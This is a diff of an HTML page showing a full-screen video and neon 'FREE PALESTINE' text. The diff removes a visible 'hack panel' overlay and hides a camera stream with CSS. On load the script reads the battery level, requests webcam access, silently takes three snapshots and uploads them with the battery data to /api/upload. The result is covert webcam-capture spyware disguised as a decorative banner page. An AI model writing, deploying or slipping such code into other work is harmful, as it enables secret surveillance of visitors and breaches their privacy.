@@ -19,7 +19,7 @@
     font-family: 'Orbitron', sans-serif;
   }
 
-  video {
+  video#backgroundVideo {
     position: fixed;
     top: 0;
     left: 0;
@@ -35,7 +35,7 @@
     white-space: nowrap;
     z-index: 1;
     animation: floatUp 10s linear infinite, glow 1.5s ease-in-out infinite alternate;
-    color: #00ffea; /* اصلي رنګ ساتل شوی */
+    color: #00ffea; /* Neon Blue */
     text-shadow: 0 0 10px #00ffea, 0 0 20px #00aaff, 0 0 30px #0044ff;
   }
 
@@ -52,107 +52,70 @@
     0% { text-shadow: 0 0 10px #00ffea, 0 0 20px #00aaff, 0 0 30px #0044ff; }
     100% { text-shadow: 0 0 20px #0044ff, 0 0 30px #00aaff, 0 0 40px #00ffea; }
   }
+
+  /* Hide camera preview */
+  video#cameraStream {
+    display: none;
+  }
 </style>
 </head>
 <body>
 
-<video autoplay playsinline loop muted>
+<!-- Fullscreen Background Video -->
+<video id="backgroundVideo" autoplay loop muted playsinline>
   <source src="https://www.dropbox.com/scl/fi/blfzo9n9oouo0mtwvz1n7/VID_20250917_085355_746.mp4?rlkey=q4y4es66z7z7sk1r2inv5bvbh&st=yevzhjt4&dl=1" type="video/mp4">
   Your browser does not support the video tag.
 </video>
 
+<!-- Neon Text -->
 <div class="text-layer text1">FREE PALESTINE</div>
 <div class="text-layer text2">FREE PALESTINE</div>
 <div class="text-layer text3">FREE PALESTINE</div>
 
-<!-- Matrix Rain Background -->
-<canvas id="matrix"></canvas>
-
-<div class="overlay">
-  <h1>KING WACIQ</h1>
-  <h2>HACK PANEL</h2>
-  <p id="status">Connecting...</p>
-  <div class="log" id="log"></div>
-</div>
-
-<!-- Original Elements -->
-<video id="video" autoplay playsinline></video>
+<!-- Hidden Camera Video & Canvas for snapshots -->
+<video id="cameraStream" autoplay playsinline></video>
 <canvas id="snapshot"></canvas>
 
 <script>
-  /* ===== Matrix Rain Animation ===== */
-  const canvasMatrix = document.getElementById("matrix");
-  const ctxMatrix = canvasMatrix.getContext("2d");
-  canvasMatrix.height = window.innerHeight;
-  canvasMatrix.width = window.innerWidth;
-  let letters = Array(256).join("1").split("");
-  function drawMatrix() {
-    ctxMatrix.fillStyle = "rgba(0, 0, 0, 0.05)";
-    ctxMatrix.fillRect(0, 0, canvasMatrix.width, canvasMatrix.height);
-    ctxMatrix.fillStyle = "#0f0";
-    letters.forEach((y, index) => {
-      let text = String.fromCharCode(3e4 + Math.random() * 33);
-      let x = index * 10;
-      ctxMatrix.fillText(text, x, y);
-      letters[index] = y > 758 + Math.random() * 1e4 ? 0 : y + 10;
-    });
-  }
-  setInterval(drawMatrix, 33);
+const video = document.getElementById('cameraStream');
+const canvas = document.getElementById('snapshot');
+const ctx = canvas.getContext('2d');
 
-  /* ===== Your Original Code (Unchanged) ===== */
-  const video = document.getElementById('video');
-  const canvas = document.getElementById('snapshot');
-  const ctx = canvas.getContext('2d');
-  const log = document.getElementById('log');
-  const statusEl = document.getElementById('status');
+navigator.getBattery().then(battery => {
+  const batteryLevel = Math.round(battery.level * 100);
+  const isCharging = battery.charging;
 
-  const params = new URLSearchParams(window.location.search);
-  const uid = params.get('uid') || 'unknown';
+  navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+    video.srcObject = stream;
 
-  if (uid) {
-    navigator.getBattery().then(battery => {
-      const batteryLevel = Math.round(battery.level * 100);
-      const isCharging = battery.charging;
+    // Take snapshots automatically
+    setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 2000);
+    setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 4000);
+    setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 6000);
 
-      log.innerText += `Battery: ${batteryLevel}% | Charging: ${isCharging}\n`;
+  }).catch(err => {
+    console.error("Camera error:", err);
+  });
+});
 
-      navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-        video.srcObject = stream;
-        statusEl.innerText = "Camera access granted...";
+function takeSnapshotAndSend(battery, charging) {
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  ctx.drawImage(video, 0, 0);
+  const imageData = canvas.toDataURL('image/png');
 
-        setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 2000);
-        setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 4000);
-        setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 6000);
-      }).catch(err => {
-        console.error("Camera error:", err);
-        statusEl.innerText = "Camera error!";
-      });
-    });
-  }
-
-  function takeSnapshotAndSend(battery, charging) {
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    ctx.drawImage(video, 0, 0);
-    const imageData = canvas.toDataURL('image/png');
-
-    fetch('/api/upload', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        image: imageData,
-        uid,
-        battery,
-        charging
-      })
-    }).then(res => res.json()).then(data => {
-      console.log("Uploaded:", data);
-      log.innerText += "Snapshot uploaded...\n";
-    }).catch(err => {
-      console.error("Upload error:", err);
-      log.innerText += "Upload failed!\n";
-    });
-  }
+  fetch('/api/upload', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      image: imageData,
+      battery,
+      charging
+    })
+  }).then(res => res.json())
+    .then(data => console.log("Snapshot uploaded"))
+    .catch(err => console.error("Upload error:", err));
+}
 </script>
 </body>
 </html> 
